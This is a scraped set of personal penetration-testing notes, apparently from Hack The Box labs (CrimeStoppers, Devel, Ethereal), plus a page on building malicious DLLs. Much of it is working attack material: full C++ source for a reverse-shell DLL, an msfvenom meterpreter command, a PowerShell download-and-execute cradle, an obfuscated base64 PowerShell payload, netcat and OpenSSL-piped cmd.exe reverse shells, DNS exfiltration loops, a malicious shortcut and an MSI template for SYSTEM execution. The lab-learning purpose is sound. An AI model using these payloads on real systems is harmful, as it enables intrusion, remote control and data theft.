DarkArmy claiming there is a Remote Code Execution bug on our Webserver. I don\u0026rsquo;t trust them and ran rkhunter, it reported that there a rootkit installed called: apache_modrootme backdoor.\nAccording to my research, if this rootkit was on the server I should be able to run \u0026ldquo;nc localhost 80\u0026rdquo; and then type \u0026ldquo;get root\u0026rdquo; to get a root shell. However, the server just errors out without providing any shell at all. Would you mind checking if this is a false positive?\nROOT There is a rootkit installed but it cannot be accessed using nc localhost 80. I tried following ippsec using radare2 but I can never get it to work like in the videos. So I used idafree-7.0, there will be a second guide that will cover setting up ida. Moving on, Looking through the Function names should notice a function called Darkarmy. Once you view the darkarmy functions after malloc hover your cursor over unk_1BF2 it will show you what we need. You may also press enter ounces its highlighted to go to the operand, you may also right click and select jump to operand. I had troubles screenshotting it. You can also press space bar to go into a different view.\nNotes : 38h in asci is 8 \u0026amp; /r is x0d\nNow to convert the asci into something readable. I found two ways to do this thank 0xdf \u0026amp; ippsec, firstIwrote a python script but you may run it in terminal.\na = 'HackTheBox' b = '\\x0E\\x14\\x0d\\x38\\x3b\\x0b\\x0c\\x27\\x1b\\x01' print [chr(ord(x) ^ ord(y)) for x,y in zip(a,b)]  b1 = bytearray(\u0026quot;\\x0E\\x14\\x0d\\x38\\x3b\\x0b\\x0c\\x27\\x1b\\x01\u0026quot;) b2 = bytearray(\u0026quot;HackTheBox\u0026quot;) for i in range(0,9): print chr(b1[i] ^ b2[i])  instead of get root its get FunSociety,\nnc 10.10.10.80 80 get FunSociety id cat /root/root.txt  ALTERNATIVE METHODS find / -type f -newermt 2017-12-17 ! -newermt 2017-12-31 -ls 2\u0026gt;/dev/null\nzcat to view gunziped files, check error.logs\nzcat access.log.[par] .* :\nzcat access.log.[1234] .* |grep -v \u0026lsquo;OPTIONS\\|HEAD\\|POST\\|GET\u0026rsquo;\nWATCH THE VIDEO\nhttps://www.youtube.com/watch?v=bgKth1K44QA\nREAD THIS GUIDE\nhttps://0xdf.gitlab.io/2018/06/03/htb-crimestoppers.html\n"
},
{
	"uri": "/concepts/dll/",
	"title": "DLL_CraFt&amp;BreW",
	"tags": [],
	"description": "",
	"content": "So, far i have done a handful of attacks with dlls. making a dll can be tricky especial when it comes to bypassing AV. Microsoft has been getting good at impoving signatures picking up the low hanging fruit. Msfvenom \u0026amp; dll\u0026rsquo;s crafted with visual studio\u0026rsquo;s. cheers to IppSec and 0xdf\nMSFVENOM remember you don\u0026rsquo;t always need x64\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll \u0026gt; NameMe.dll  Beryllium https://github.com/attl4s/pruebas\na dll that contains meterpreter shell that takes env var as variables\nset PORT=443 set IP=10.10.14.1 setx PORT 443 setx IP 10.10.14.1  Crafting A DLL\nThese have already been edited and do not need to be change except for IP \u0026amp; PORT on revshell.cpp.\n###WARNING### THE SHELL TOTALLY SUCKS. lol\n(dllmain.cpp)\n#include \u0026quot;rev_shell.h\u0026quot; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReservered) { switch (fwdReason) { case DLL_PROCESS_ATTACH: rev_shell(); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; }  (revshell.cpp)\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;process.h\u0026gt; #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;ws2tcpip.h\u0026gt; #pragma comment(lib, \u0026quot;Ws2_32.lib\u0026quot;) #define REMOTE_ADDR \u0026quot;10.10.15.136\u0026quot; #define REMOTE_PORT \u0026quot;9135\u0026quot; void rev_shell() { FreeConsole(); WSADATA wsaData; int iResult = WSAStartup(MAKEWORD(2, 2), \u0026amp;wsaData); struct addrinfo *result = NULL, *ptr = NULL, hints; memset(\u0026amp;hints, 0, sizeof(hints)); hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM; hints.ai_protocol = IPPROTO_TCP; getaddrinfo(REMOTE_ADDR, REMOTE_PORT, \u0026amp;hints, \u0026amp;result); ptr = result; SOCKET ConnectSocket = WSASocket(ptr-\u0026gt;ai_family, ptr-\u0026gt;ai_socktype, ptr-\u0026gt;ai_protocol, NULL, NULL, NULL); connect(ConnectSocket, ptr-\u0026gt;ai_addr, (int)ptr-\u0026gt;ai_addrlen); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(\u0026amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(\u0026amp;pi, sizeof(pi)); si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; si.hStdInput = (HANDLE)ConnectSocket; si.hStdOutput = (HANDLE)ConnectSocket; si.hStdError = (HANDLE)ConnectSocket; TCHAR cmd[] = TEXT(\u0026quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\CMD.EXE\u0026quot;); CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, \u0026amp;si, \u0026amp;pi); WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); WSACleanup(); }  (rev_shell.h)\n#pragma Once void rev_shell();  Compiling - Compile it for x86 or x64.\ni686-w64-mingw32-gcc -shared -o DemoDll-x86.dll dllmain.cpp revshell.cpp rev_shell.h -lws2_32 x86_64-w64-mingw32-gcc -shared -o DemoDll-x86.dll dllmain.cpp revshell.cpp rev_shell.h -lws2_32  "
},
{
	"uri": "/concepts/untitled/",
	"title": "Desync-Attack",
	"tags": [],
	"description": "",
	"content": "This writeup will be based on James Kettle work, Click here. This artical is more about me learning how to do this attack.\n"
},
{
	"uri": "/hackthebox/boxes/devel/",
	"title": "Devel",
	"tags": [],
	"description": "",
	"content": "nmap -sT -p- -Pn -T5 nmap/initial 10.10.10.5 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-23 14:57 EST Unable to split netmask from target expression: \u0026quot;nmap/initial\u0026quot; Nmap scan report for 10.10.10.5 Host is up (0.044s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 75.84 seconds  nmap -sV -sC -p21,80 nmap/http-ftp 10.10.10.5 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-23 15:01 EST Unable to split netmask from target expression: \u0026quot;nmap/http-ftp\u0026quot; Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 15:01 (0:00:06 remaining) Nmap scan report for 10.10.10.5 Host is up (0.039s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 01:06AM \u0026lt;DIR\u0026gt; aspnet_client | 02-27-19 12:20AM 2788 getfuckd.aspx | 03-17-17 04:37PM 689 iisstart.htm |_03-17-17 04:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  filtered ports\n  FTP\nftp as anonymous\nftp 10.10.10.5  as you can see i uploaded a asp \u0026amp; an aspx. the former did not work out for me. the later opened a shell.\nsend it over to burp turn on intercept.\nSetup up python http server \u0026amp; NetCat listener. Then run powershell iex\npython -m http.server 80  nc -lvnp 443  IEX invoke\nbe sure to url encode this string when using burp no need to encode when using the webpage.\nIEX(New-Object Net.WebClient).downloadstring(http://10.10.14.49/Invoke-PowerShellTcp.ps1)  NC.EXE\nthis one tricky i tried to be cool and run it form the nishang shell and cmd.aspx but i keep running into error. i\u0026rsquo;ve run it with c:\\windows\\syswow64\\cmd.exe. anywho the only way i got this to work was executing this from the smbshare. since the smb share isn\u0026rsquo;t exposed to the outside. you could run this form inside nishang or the webportal.\nnc -lvnp 1920  locate smbserver.py mkdir smb \u0026lt;=== put stuff here ./smbserver.py share smb \\\\10.10.14.49\\share\\nc.exe -e cmd.exe 10.10.14.49 1920  SHELL\nwhoami\toutput iis apppool\\web  No, idea what to do here going to start running various powershell scripts to see if i can elevate my privledges.\nc:\\windows\\system32\\powershell -NoE -Nop -NonI -ExecutionPolicy Bypass -C \u0026quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()\u0026quot;  IIS WEB ROOT DIRECTORY\nC:\\inetpub\\wwwroot  Enumeration\nWindows version\nsysteminfo  systeminfo Host Name: DEVEL OS Name: Microsoft Windows 7 Enterprise OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: babis Registered Organization: Product ID: 55041-051-0948536-86302 Original Install Date: 17/3/2017, 4:17:31 ?? System Boot Time: 27/2/2019, 6:48:35 ?? System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x64 Family 6 Model 79 Stepping 1 GenuineIntel ~2400 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 5/4/2016 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 1.024 MB Available Physical Memory: 641 MB Virtual Memory: Max Size: 2.048 MB Virtual Memory: Available: 1.267 MB Virtual Memory: In Use: 781 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.5  Watson\nRead oxdf guide on setting up watson. Nishang shells suck. Running things inside of powershell kind of sucks. Execute this using the smbshare.\n\\\\10.10.14.49\\share\\Watson.exe  [*] OS Build number: 7600 [*] CPU Address Width: 32 [*] Process IntPtr Size: 4 [*] Using Windows path: C:\\WINDOWS\\System32 [*] Appears vulnerable to MS10-073 [\u0026gt;] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel. [\u0026gt;] Exploit: https://www.exploit-db.com/exploits/36327/ [\u0026gt;] Notes: None. [*] Appears vulnerable to MS10-092 [\u0026gt;] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Als o, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision , an attacker can execute arbitrary commands with SYSTEM privileges. [\u0026gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb [\u0026gt;] Notes: None. [*] Appears vulnerable to MS11-046 [\u0026gt;] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges. [\u0026gt;] Exploit: https://www.exploit-db.com/exploits/40564/ [\u0026gt;] Notes: None. [*] Appears vulnerable to MS12-042 [\u0026gt;] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode. [\u0026gt;] Exploit: https://www.exploit-db.com/exploits/20861/ [\u0026gt;] Notes: None. [*] Appears vulnerable to MS13-005 [\u0026gt;] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation. [\u0026gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb [\u0026gt;] Notes: None.  MS11-046\nbe sure to run this in a netcat.exe shell and not a nishang shell..\ngoogle windows-kernel-exploits locate MS11-046 \\\\10.10.14.49\\share\\MS11-046.exe  "
},
{
	"uri": "/hackthebox/boxes/ethereal/",
	"title": "Ethereal",
	"tags": [],
	"description": "",
	"content": " there is allot going on with this box first we go to ftp but we can only interact with it using some other methods. used wget to download the drive. inside the drives we find pbox then use that to get some creds. go back to the website enter creds. play around with the waf to run cmd\u0026rsquo;s. then have to write a python script to get a shell. it just keeps going.\nnmap revealed ftp 21, Microsoft iis httpd 10.0 which is 2016 and up.\nnmap -sC -sV -T4 -Pn -oA tcp-connect 10.10.10.106 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 00:05 EDT Nmap scan report for 10.10.10.106 Host is up (0.30s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106 | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Ethereal 8080/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Bad Request Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  FTP ACCESS\ni would like to take this time and play around with the ftp service and explore different ways to access it.\nftp://anonymous@10.10.10.1066  using wget pretty neat trick.\nwget --no-passive-ftp -m ftp://anonymous:password@10.10.10.106 -m mirror -c continue download --no-passive-ftp  web enumeration\nthe website has four pages that are accessible.\nGREP - this was pretty neat it print out file\u0026rsquo;s that match the pattern.\ngrep -R password .  Using the md5sum to check the bianry against virus total was fucking sweet.\nmd5sum ./10.10.10.106/binaries/Orca.Msi  using some kind of command line with file to print out both files\nfile *DISK{,1,2}  so apparently you don\u0026rsquo;t want to keep original backups or modify any of the original files. so ippsec made a new directory then copied the files over.\nfind . -ls du -hs * md5sum * strings *  so mounted the drives to /mnt/ethereal and found pbox.dat in FDISK. pbox stores the password file at /root/pbox.dat the file is password encrypted. the password is password lol, but we will cover two ways to do this. Download pbox locally from the sourceforge page . Then take the pbox.dat file from fdisk and move it over to root/.pbox.dat.\nippsec made a list using vim, then used awk to print out the table/list. i suppose the colon in username:password. the -F switch is using the colon xD\nawk -F: '{print $1}' password.txt| sort -u \u0026gt; user.txt awk -F: '{print $2}' password.txt| sort -u \u0026gt; pass.txt  after the list are made use hydra to bruteforce the webpage. ippsec use a different request method get-http\nhydra -L user.txt -P pass.txt http://ethereal.htb:8080 hydra -L user.txt -P pass.txt httt-get://ethereal.htb:8080  user:\talan pass:\t!C414m17y57r1k3s4g41n!  we can do nested commands with \u0026amp;\u0026amp;\nI\u0026rsquo;m just going to guess before i continue that this is the where the cmd injection is.\n-n 1 10.10.14.2 \u0026amp;\u0026amp; ping -n 1 10.10.14.2  next setup tcpdump\ntcpdump -i tun0 icmp  TCPDUMP - DNS\nthe 1 will tell you output is coming out the later will not\ntcpdump -i tun0 -vvv udp port 53 tcpdump -i tun0 -vvv dns tcpdump -i tun0 -nnXSs 0 udp port 53 -w dns.pcap  RESPONDER\nchanged cmd to dir /b which is like ls -la or list all files including hidden files.\nxD viewstate.\ncertutil.exe -urlcache -split -f http://10.10.14.2/Invoke-pinkie.ps1 Invoke-pinkie.ps1  we are skipping allot of the pain right here. there is a firewall inplace that\u0026rsquo;s preventing connect back so it won\u0026rsquo;t connect. we have to use dns tools to bypass the firewall restrictions.\nnslookup pinkiepie 10.10.10.106 nslookup %USERNAME% 10.10.10.106 #whoami doenst work  for /f %a in ('cmd /c \u0026quot;whoami\u0026quot;') do (nslookup %a 10.10.14.2)  for /f %a in ('cmd /c \u0026quot;whoami\u0026quot;') do (nslookup %a 10.10.14.2) edit do not need cmd /c dir /b print one line at a time.  for /f \u0026quot;tokens=1,2,3\u0026quot; %a in ('dir') do (echo %a%b%c) for /f \u0026quot;tokens=1,2,3,4,5,6\u0026quot; %a in ('dir') do (echo %a%b%c%d%e%f) for /f %a in ('dir /b') do (nslookup %a 10.10.14.2)  so ippsec moved over to windows to do the box. he wrote a script using scapy\ncmd /c for /f %a in ('dir /b') do (echo %a)  so blah blah blah. now we are writing a a python script to the script so far pulls in quite the handful of python modules.I would like to cover theses a little bit because most of these are new.\nscrapy simply put is tcpdump for python. it will allow us to interact with packets.\nThreading i have no idea what threading module does. okay, so apparently the way python works you can\u0026rsquo;t run different task on different processors at the same time you can but there is overhead and beyond the scope of this. what this does is give each processor a task it runs each task one at a time. but this allows it to run certain task quicker, or keep some on the backburner waiting. this doesn\u0026rsquo;t work like you would think it does. lol\ni have used the requests module before nothing new. the authentication aspect is kind of new.\nBeautiful soup makes interacting with webpages easy lol will help with dealing witht he viewstates.\n__VIEWSTATE= __VIEWSTATEGENERATOR= __EVENTVALIDATION=3D\u0026amp; search=-n+1+127.0.0.1+%26%26+for+/f+%25a+in+('dir+/b')+do+(nslookup+%25a+10.10.14.2)\u0026amp;ctl02=  PLAYING AROUND\nNOTE NEED TO HAVE RESPONDER ON TO STOP THE DOUBLE SUBMITTIONS\nWINDOWS ENUMERATION\nset whoami /all /priv  no output need to go back the script and edit args into \u0026lsquo;cmd /c\u0026rdquo;{args}\u0026ldquo;\u0026rsquo;\nnetsh advfirewall firewall show rule name=all direction=out | findstr /c:Name:  output\nnetsh advfirewall firewall show rule name=all direction=out | findstr /c:Name: Rule Name: @{Microsoft.XboxGameCallableUI_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.XboxGameCallableUI/resources/PkgDisplayName} Rule Name: @{Microsoft.Windows.Apprep.ChxApp_1000.14393.2339.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Apprep.ChxApp/resources/DisplayName} Rule Name: @{Microsoft.LockApp_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName} Rule Name: @{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/DisplayName} Rule Name: @{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/PackageDisplayName} Rule Name: @{Microsoft.Windows.ShellExperienceHost_10.0.14393.2068_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.ShellExperienceHost/resources/PkgDisplayName} Rule Name: @{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudExperienceHost/resources/appDescription} Rule Name: @{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources/PackageDisplayName} Rule Name: Allow ICMP Request Rule Name: Allow UDP Port 53 Rule Name: Allow TCP Ports 73, 136 Rule Name: Allow ICMP Reply  proga #so we have 3 ports. easiest way to go into program files is progra 1 \u0026amp; 2\ncd \\ cd progra~1 dir c:\\progra~2\\  we\u0026rsquo;re hunting for a program on the file system to use to connect back. ippsev went to lolbas-pogject.github.io which a web used in a couple of his videos and there is another web site i believe for linux. you may typican binaries and it will tell you about the binary or whatever.\nThe system has openssl we will use lolbas to figure out\nmake openssl cert\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes  client\nopenssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2]  server\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 73 openssl s_server -quiet -key [keyfile] -cert [cert] -port [port1] openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2]  openSSL revershell from windows client. there is a simple command we can use to if the host has the openssl bianrey.\nstart cmd.exe /c #open a whole new terminal  move cursor to desirded area then do 9 + yy\ncmd c:\\propra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -connect 10.10.14.2:73 cmd c:\\progra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -connect 10.10.14.2:136 c:\\progra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -quiet -connect 10.10.14.2:73 | c:\\progra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -connect 10.10.14.2:136 quiet | cmd.exe | cmd.exe w  c:\\progra~1\\OpenSSL-Win64\\bin\\openssl.exe s_client -quiet -connect 10.10.14.2:73| cmd.exe | c:\\progra~1\\OpenSSL-Win64\\bin\\openssl.exe s_client -connect 10.10.14.2:136\u0026quot;  making a malicous short cut.\n   $WScript = New-Object -COM WScript.shell \u0026gt;\u0026gt; $SC= $WScript.CreateShortcut('pinkiepie.lnk') \u0026gt;\u0026gt; $SC \u0026gt;\u0026gt; $SC.TargetPath=\u0026quot;C:\\Windows\\System32\\cmd.exe\u0026quot; \u0026gt;\u0026gt; $SC.Arguments=\u0026quot;/c c:\\progra~1\\OpenSSL-Win64\\bin\\openssl.exe s_client -quiet -connect 172.16.42.86:9913| cmd.exe | c:\\progra~1\\OpenSSL-Win64\\bin\\openssl.exe s_client -connect 172.16.42.86:9135\u0026quot; \u0026gt;\u0026gt; $sc \u0026gt;\u0026gt; $SC.Save()  $WScript = New-Object -COM WScript.shell $SC= $WScript.CreateShortcut('pinkiepie.lnk') $SC $SC.TargetPath=\u0026quot;C:\\Windows\\System32\\cmd.exe\u0026quot; $SC.Arguments=\u0026quot;/c c:\\progra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | c:\\progra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -connect 10.10.14.2:136\u0026quot; $sc $SC.Save()  set PATH=\u0026quot;c:\\progra~2\\openssl-v1.1.0\\bin\\\u0026quot;;%PATH% openssl base64 -in myca.cer openssl base64 -in myca.pvk  there was a d drive a missed in the begining i didn\u0026rsquo;t have permissios to that i can now use as jorge that is where vs is installed.\nhttps://blog.xpnsec.com/becoming-system/\ncandle.exe msigen.wix light.exe msigen.wixobj  set PATH=C:\\Program Files (x86)\\Windows kits\\10\\bin\\10.0.17763.0\\x64\\;%PATH%  \u0026quot;c:\\users\\user\\desktop\\wix311-binaries\\candle.exe\u0026quot; death-pie.wix \u0026quot;c:\\users\\user\\desktop\\wix311-binaries\\light.exe\u0026quot; death-pie.wixobj  \u0026quot;C:\\Program Files (x86)\\Windows kits\\10\\bin\\10.0.17763.0\\x64\\makecert.exe\u0026quot; -pe -n \u0026quot;CN=Ethereal\u0026quot; -a sha256 -cy end -sky signature -ic .\\myca.cer -iv .\\myca.pvk -sv .\\death-pie.pvk .\\death-pie.cer  c:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v7.1A\\Bin  \u0026quot;C:\\Program Files (x86)\\Windows kits\\10\\bin\\10.0.17763.0\\x64\\pvk2pfx.exe\u0026quot; -pvk death-pie.pvk -spc death-pie.cer -pfx death-pie.pfx  \u0026quot;C:\\Program Files (x86)\\Windows kits\\10\\bin\\10.0.17763.0\\x64\\signtool.exe\u0026quot; sign /v /f death-pie.pfx death-pie.msi  ippsec uses the laready placed lnk isntead of intereing a new command\ncopy\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 73 \u0026lt; ../smb/death-pie.msi c:\\progra~1\\OpenSSL-Win64\\bin\\openssl.exe s_client -quiet -connect 10.10.14.2:73 \u0026gt; c:\\users\\public\\desktop\\shortcuts\\death-pie.msi  USER.TXT\ncouple phases for user first make a Malicious lnk file. make one on a windows machine using powershell, or LNKup (kali) once you have made the file move it over to kali. then upload it to ethereal. move it to c:\\users\\public\\desktop\\shortcuts. then setup the openssl listeners. the script should click on it within a minute. Find a note in the d drive which is used by visual studio in the case. dev\\msis is where the is note. we will also find the certs in the d drive.\nfsutil fsinfo drives  $WScript = New-Object -COM WScript.shell $SC= $WScript.CreateShortcut('pinkiepie.lnk') $SC $SC.TargetPath=\u0026quot;C:\\Windows\\System32\\cmd.exe\u0026quot; $SC.Arguments=\u0026quot;/c c:\\progra~1\\OpenSSL-Win64\\bin\\openssl.exe s_client -quiet -connect 172.16.42.86:9913| cmd.exe | c:\\progra~1\\OpenSSL-Win64\\bin\\openssl.exe s_client -connect 172.16.42.86:9135\u0026quot; $sc $SC.Save()  We will also find the certs need to sign the installer in the d drive under the cert directory. moving those was pretty easy i think using openssl to base64 encode the certs then move them over. base64 will help preserver all the hidden characters etc. copy and paste over.\nc:\\progra~2\\OpenSSL-v1.1.0\\bin\\openssl base64 -e -in d:\\certs\\myca.cer c:\\progra~2\\OpenSSL-v1.1.0\\bin\\openssl base64 -e -in d:\\certs\\myca.pvk  ROOT.TXT this part can be rather tricky. so first off i move the myca files over then added them to CA root authority. i spent my nights trying to get this part to work but i wasn\u0026rsquo;t able to properly sign the binary i suppose and never got a shell. because of this error.\nfirst i made the wix using https://blog.xpnsec.com/becoming-system/ an awesome template. an aweosme read and apartently there a big that remove the entry for add or remote programs so you can remove. by running a vbscript\n\u0026lt;File Id=\u0026quot;ApplicationFile1\u0026quot; Source=\u0026quot;example.exe\u0026quot;/\u0026gt;  Have a couple of choices first is to use the openssl command or use the lnk file used to get user.\n\u0026lt;Property Id=\u0026quot;cmdline\u0026quot;\u0026gt;cmd /c HERE OVER HERE  there are some slight change you could use instead of openssl-v1.1.0 or openss~1.0.\ncmd /c c:\\users\\public\\desktop\\shortcuts\\pinkiepie.lnk cmd /c c:\\progra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | c:\\progra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -connect 10.10.14.2:136  this is optional. impersonate the user or run as system.\n Return=\u0026quot;ignore\u0026quot; Impersonate=\u0026quot;no\u0026quot;/\u0026gt;  \u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt; \u0026lt;Wix xmlns=\u0026quot;http://schemas.microsoft.com/wix/2006/wi\u0026quot;\u0026gt; \u0026lt;Product Id=\u0026quot;*\u0026quot; UpgradeCode=\u0026quot;12345678-1234-1234-1234-111111111111\u0026quot; Name=\u0026quot;Example Product Name\u0026quot; Version=\u0026quot;0.0.1\u0026quot; Manufacturer=\u0026quot;@_xpn_\u0026quot; Language=\u0026quot;1033\u0026quot;\u0026gt; \u0026lt;Package InstallerVersion=\u0026quot;200\u0026quot; Compressed=\u0026quot;yes\u0026quot; Comments=\u0026quot;Windows Installer Package\u0026quot;/\u0026gt; \u0026lt;Media Id=\u0026quot;1\u0026quot; Cabinet=\u0026quot;product.cab\u0026quot; EmbedCab=\u0026quot;yes\u0026quot;/\u0026gt; \u0026lt;Directory Id=\u0026quot;TARGETDIR\u0026quot; Name=\u0026quot;SourceDir\u0026quot;\u0026gt; \u0026lt;Directory Id=\u0026quot;ProgramFilesFolder\u0026quot;\u0026gt; \u0026lt;Directory Id=\u0026quot;INSTALLLOCATION\u0026quot; Name=\u0026quot;Example\u0026quot;\u0026gt; \u0026lt;Component Id=\u0026quot;ApplicationFiles\u0026quot; Guid=\u0026quot;12345678-1234-1234-1234-222222222222\u0026quot;\u0026gt; \u0026lt;File Id=\u0026quot;ApplicationFile1\u0026quot; Source=\u0026quot;example.exe\u0026quot;/\u0026gt; \u0026lt;/Component\u0026gt; \u0026lt;/Directory\u0026gt; \u0026lt;/Directory\u0026gt; \u0026lt;/Directory\u0026gt; \u0026lt;Feature Id=\u0026quot;DefaultFeature\u0026quot; Level=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;ComponentRef Id=\u0026quot;ApplicationFiles\u0026quot;/\u0026gt; \u0026lt;/Feature\u0026gt; \u0026lt;Property Id=\u0026quot;cmdline\u0026quot;\u0026gt;COMMANDS HERE \u0026lt;/Property\u0026gt; \u0026lt;CustomAction Id=\u0026quot;SystemShell\u0026quot; Execute=\u0026quot;deferred\u0026quot; Directory=\u0026quot;TARGETDIR\u0026quot; ExeCommand='[cmdline]' Return=\u0026quot;ignore\u0026quot; Impersonate=\u0026quot;yes\u0026quot;/\u0026gt; \u0026lt;CustomAction Id=\u0026quot;FailInstall\u0026quot; Execute=\u0026quot;deferred\u0026quot; Script=\u0026quot;vbscript\u0026quot; Return=\u0026quot;check\u0026quot;\u0026gt; invalid vbs to fail install \u0026lt;/CustomAction\u0026gt; \u0026lt;InstallExecuteSequence\u0026gt; \u0026lt;Custom Action=\u0026quot;SystemShell\u0026quot; After=\u0026quot;InstallInitialize\u0026quot;\u0026gt;\u0026lt;/Custom\u0026gt; \u0026lt;Custom Action=\u0026quot;FailInstall\u0026quot; Before=\u0026quot;InstallFiles\u0026quot;\u0026gt;\u0026lt;/Custom\u0026gt; \u0026lt;/InstallExecuteSequence\u0026gt; \u0026lt;/Product\u0026gt; \u0026lt;/Wix\u0026gt;  CN is important. -a may not be\n\u0026quot;C:\\Program Files (x86)\\Windows kits\\10\\bin\\10.0.17763.0\\x64\\makecert.exe\u0026quot; -pe -n \u0026quot;CN=My spc\u0026quot; -a sha256 -cy end -sky signature -ic myca.cer -iv myca.pvk -sv myspc.pvk 